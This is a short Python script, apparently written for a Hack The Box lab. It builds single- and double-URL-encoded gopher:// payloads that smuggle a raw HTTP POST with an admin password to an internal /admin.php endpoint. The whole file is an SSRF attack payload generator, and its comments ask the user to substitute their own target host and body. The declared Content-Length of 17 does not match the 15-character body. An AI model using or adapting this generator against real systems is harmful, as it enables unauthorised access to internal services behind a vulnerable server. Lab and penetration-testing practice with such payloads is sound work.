from urllib.parse import quote

payload = ("POST /admin.php HTTP/1.1\r\n"
           "Host: dataserver.htb\r\n"
           "Content-Length: 17\r\n"
           "Content-Type: application/x-www-form-urlencoded\r\n"
           "\r\n"
           "passwd=admin123")# YOU NEED TO CHANGE THIS

# 1) First pass: keep / and : so /admin.php and header colons stay readable
enc1 = quote(payload, safe="/-._:")
# 2) But force ONLY the HTTP version slash to be encoded
enc1 = enc1.replace("HTTP/1.1", "HTTP%2F1.1", 1)

u1 = f"gopher://dataserver.htb:80/_{enc1}"     # single-encoded - YOU NEED TO CHANGE THE HOST HERE EXAMPLE dataserver.htb -> someserver.htb accordingly.
u2 = quote(u1, safe="/")                        # double-encoded (slashes preserved)

print(u1)
print(u2)
